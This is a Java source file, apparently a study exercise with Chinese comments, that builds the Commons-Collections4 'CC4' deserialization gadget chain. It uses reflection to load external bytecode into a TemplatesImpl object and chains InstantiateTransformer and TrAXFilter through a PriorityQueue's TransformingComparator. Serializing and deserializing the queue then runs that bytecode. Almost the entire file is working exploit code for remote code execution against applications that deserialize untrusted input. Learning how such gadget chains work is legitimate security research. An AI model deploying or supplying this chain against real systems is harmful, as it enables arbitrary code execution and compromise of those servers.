import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

// 使用的是commons-collections4.0
public class CC4 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();

        Class c = templates.getClass();
        Field fieldName = c.getDeclaredField("_name");
//        为了满足if判断逻辑
        fieldName.setAccessible(true);
        fieldName.set(templates,"aaa");
//         获取字节码属性
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);

//        获取字节码
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        //        使用ChainedTransformer包裹InstantiateTransformer，并触发InstantiateTransformer.transformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        });

//      创建TransformingComparator
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer,null);

        //        PriorityQueue.readObject中会触发comparator.compare。这里当add第二个值时会触发comparator.compare,所以这里还是先填充其他的transformingComparator
        PriorityQueue<Object> o = new PriorityQueue<>(2,new TransformingComparator<>(new ConstantTransformer<>(1)));
//        过 heapify()的 size >>> 1判断逻辑    “2 >>> 1”  0000 0010  -> 0000 0001
//        “>>>” 右移 补0 以8位为单位
        o.add(templates);
        o.add(1);

//        再通过反射填充回装有invokerTransformer的transformingComparator
        Class<? extends PriorityQueue> oClass = o.getClass();
        Field oClassDeclaredField = oClass.getDeclaredField("comparator");
        oClassDeclaredField.setAccessible(true);
        oClassDeclaredField.set(o,transformingComparator);

//        serialize(o);
        unSerialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
